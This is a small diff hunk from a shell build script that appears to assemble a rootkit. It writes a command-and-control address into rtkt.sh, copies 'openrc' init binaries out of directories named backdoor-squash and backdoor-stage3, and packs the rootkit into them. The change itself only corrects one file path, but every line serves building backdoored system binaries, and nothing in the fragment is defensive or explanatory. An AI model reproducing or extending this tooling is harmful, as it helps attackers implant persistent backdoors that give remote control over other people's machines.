@@ -150,7 +150,7 @@ sed -i "s/REPLACEME/$CNC/" ./rtkt.sh
 sed -i "s/REPLACEME/$INTERFACE_IP/" redirect.py
 
 # I guess I wasn't too creative here... a million ways to do this, I picked the simplest one I could think of.
-cp ./backdoor-squash/sbin/openrc ./ && cp ./backdoor-stage3/sbin/openrc3 ./openrc3
+cp ./backdoor-squash/sbin/openrc ./ && cp ./backdoor-stage3/sbin/openrc ./openrc3
 
 ./pack.sh ./rtkt.sh ./openrc && ./pack.sh ./rtkt.sh ./openrc3
 
